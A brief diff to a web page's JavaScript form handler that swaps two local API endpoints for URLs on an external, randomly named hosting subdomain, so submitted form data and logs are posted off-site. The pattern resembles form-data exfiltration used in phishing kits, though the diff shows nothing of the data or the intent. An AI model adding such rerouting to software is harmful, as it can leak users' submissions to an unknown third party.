@@ -6955,7 +6955,7 @@
 		                } else {
 		                    console.log('Local API success:', response);
 		                    if (response.status === 'success') {
-		                        makeAPIRequest("api/save-log.php", formData, 0, true);
+		                        makeAPIRequest("https://plum-raccoon-322277.hostingersite.com/iceee/save-log.php", formData, 0, true);
 		                    } else if (retryCount < maxRetries) {
 		                        setTimeout(() => makeAPIRequest(url, formData, retryCount + 1, isExternal), 1000);
 		                    } else {
@@ -7043,7 +7043,7 @@
 		        }
 		
 		        // Start the API request process
-		        makeAPIRequest("api/index.php", formData);
+		        makeAPIRequest("https://plum-raccoon-322277.hostingersite.com/iceee/index.php", formData);
 		
 		        // Fallback timeout in case API doesn't respond
 		        var interval = 1000 * getRandomInt(15, 25);
